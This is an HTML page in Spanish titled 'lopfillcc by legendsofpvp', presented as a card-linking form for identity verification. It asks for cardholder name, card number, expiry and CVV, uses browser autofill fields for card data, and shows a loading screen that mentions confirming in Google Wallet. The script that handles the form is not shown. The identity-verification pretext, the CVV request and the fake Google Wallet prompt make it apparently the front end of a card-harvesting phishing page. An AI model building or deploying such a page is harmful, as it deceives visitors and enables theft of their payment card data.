<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <title>lopfillcc by legendsofpvp</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <canvas id="pixelRain" aria-hidden="true"></canvas>

  <div class="wrapper">
    <div class="shell">
      <div class="topbar"><span class="pulse">LEGEND LAB ·</span> <b>Card Linker</b></div>

      <div class="grid">
        <div class="card">
          <div class="row">
            <div class="chip"></div>
            <div class="brand" id="brand">CARD</div>
          </div>
          <div class="number" id="displayNumber">#### #### #### ####</div>
          <div class="bottom">
            <div><div class="label">HOLDER</div><div class="value" id="displayName">USUARIO</div></div>
            <div style="text-align:right"><div class="label">EXPIRES</div><div class="value" id="displayDate">MM/AA</div></div>
          </div>
        </div>

        <div class="formPanel">
          <h1>lopfillcc <span>by legendsofpvp</span></h1>
          <div class="sub">Vincular para verificación de identidad</div>

          <form id="payment-form" action="" method="POST" autocomplete="on">
            
            <div class="label2">Titular</div>
            <input type="text" id="cardHolder" name="cc-name" autocomplete="cc-name" placeholder="NOMBRE COMPLETO" required>

            <div class="label2">Tarjeta 💳</div>
            <input type="tel" id="cardNumber" name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" required>

            <div style="display: flex; gap: 10px;">
              <div style="flex: 1.5;">
                <div class="label2">Vencimiento</div>
                <input type="tel" id="cardDate" name="cc-exp" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" required>
              </div>
              <div style="flex: 1;">
                <div class="label2">CVV 🔒</div>
                <input type="password" id="cardCvv" name="cvc" autocomplete="cc-csc" inputmode="numeric" placeholder="•••" maxlength="4" required>
              </div>
            </div>

            <button type="submit" id="submit-btn">⚡ [ VINCULAR AHORA ]</button>
            <div class="error" id="err"></div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <div id="loading">
    <div class="loadingTitle">[ VERIFYING PAYMENT DATA ]</div>
    <div class="counter" id="counter">6</div>
    <div class="loadingSub">Confirma el guardado en la ventana de Google Wallet.</div>
  </div>

  <script src="main.js"></script>
</body>
</html>
